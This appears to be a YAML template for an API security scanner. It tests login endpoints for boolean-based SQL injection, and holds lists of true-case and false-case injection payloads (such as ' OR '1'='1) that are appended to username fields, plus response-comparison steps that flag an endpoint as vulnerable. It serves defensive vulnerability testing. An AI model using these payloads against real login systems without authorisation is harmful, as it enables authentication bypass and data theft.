id: BOOLEAN_BASED_SQLI
info:
  name: "Boolean based SQL Injection test on Login Endpoints"
  description: >
    "A Boolean-based SQL Injection test on login endpoints involves manipulating the input fields (such as username and password) with SQL statements that result in true or false conditions. By observing the application's response, testers can infer whether the SQL query execution is being influenced. This method helps in identifying vulnerabilities without retrieving actual data, as it relies on changes in application behavior or error messages."
  details: >
    "Boolean-based SQL Injection testing on login endpoints involves injecting SQL statements into input fields to create conditions that evaluate to true or false. By monitoring the application's responses to these injections, testers can determine if the endpoint is vulnerable to SQL Injection. This technique does not extract data directly but relies on changes in the application's behavior or responses to infer the presence of a vulnerability."
  impact: >
    "The impact of Boolean-based SQL Injection on login endpoints can be severe, potentially allowing unauthorized access to user accounts or administrative functions. If exploited, attackers can bypass authentication mechanisms, access sensitive information, and execute arbitrary SQL commands, leading to data breaches, loss of data integrity, and potential full system compromise. This vulnerability poses a significant threat to the security and privacy of the application's users."

  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: BOOLEAN_BASED_SQLI
  severity: MEDIUM
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901

settings:
  nature: INTRUSIVE
api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  method:
    neq: "OPTIONS"
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
      - <html>
      - </html>
  url:
    contains_either:
      - login
      - signin
      - authenticate
      - auth
  request_payload:
    for_one:
      key:
        regex: "username|^user$|^userid$|^user_id$|^login$|^login_id$|email|^account$|^account_id$|^member$|^member_id$|^id$|user_name|^uname$|^identifier$|^user_identifier$|^admin$|^nick$|^nickname$|^handle$|^alias$|^principal$|^profile$|^profile_id$|^name$|^signin$|^auth$|^credential$|^user_login$|^user_account$|^user_email$|^employee$|^employee_id$|^operator$|^customer_id$|^client_id$|^subscriber$|^subscriber_id$|^participant$|^participant_id$|^client_id$|^userLoginID$|^client-name$"
        extract: userKey
      value:
        extract: userVal
wordLists:
  trueCasePayloads:
    - "' OR '1'='1"
    - "\" OR \"1\"=\"1"
    - "') OR ('1'='1"
    - "') OR '1'='1'--"
    - "\" OR \"1\"=\"1\"--"
    - "' OR 1=1--"
    - "\" OR 1=1--"
    - "') OR 1=1--"
    - "') OR ('a'='a"
    - "') OR 'a'='a'--"
    - "\" OR \"a\"=\"a\""
    - "\" OR \"a\"=\"a\"--"
  falseCasePayloads:
    - "' AND '1'='2"
    - "\" AND \"1\"=\"2"
    - "') AND ('1'='2"
    - "') AND '1'='2'--"
    - "\" AND \"1\"=\"2\"--"
    - "' AND 1=2--"
    - "\" AND 1=2--"
    - "') AND 1=2--"
    - "') AND ('a'='b"
    - "') AND 'a'='b'--"
    - "\" AND \"a\"=\"b\""
    - "\" AND \"a\"=\"b\"--"
execute:
  type: multiple
  requests:
    - req:
        - modify_body_param:
            userKey: ${userVal}${falseCasePayloads}
        - validate:
            or:
              - response_code:
                  gte: 400
                  lt: 410
              - response_payload:
                  not_contains:
                    - Error
                    - fail
                    - invalid
                    - expired
                    - not found
                    - account is locked
                    - account is blocked
                    - rate-limit
                    - rate_limit
                    - rate limit
                    - multiple failed attempt
                    - Attention Required!
                    - CloudFlare
                    - Sorry, you have been blocked
                    - " AND "
                    - "="
                    - "--"
        - success: x2
        - failure: exit
    - req:
        - modify_body_param:
            userKey: ${userVal}${trueCasePayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              neq: "${x1.response.body}"
              not_contains:
                - rate-limit
                - rate limit
                - rate_limit
                - account is locked
                - account is blocked
                - multiple failed attempt
                - Attention Required!
                - CloudFlare
                - Sorry, you have been blocked
                - " OR "
                - "="
                - "--"
                - "fail"
                - "invalid"
                - <html>
                - </html>
        - success: x3
        - failure: exit
    - req:
        - add_header:
            dummyHeader: dummyValue
        - modify_body_param:
            userKey: ${userVal}${trueCasePayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              eq: "${x2.response.body}"
              not_contains:
                - rate-limit
                - rate limit
                - rate_limit
                - account is locked
                - account is blocked
                - multiple failed attempt
                - Attention Required!
                - CloudFlare
                - Sorry, you have been blocked
                - " OR "
                - "="
                - "--"
                - "fail"
                - "invalid"
                - <html>
                - </html>
        - success: vulnerable
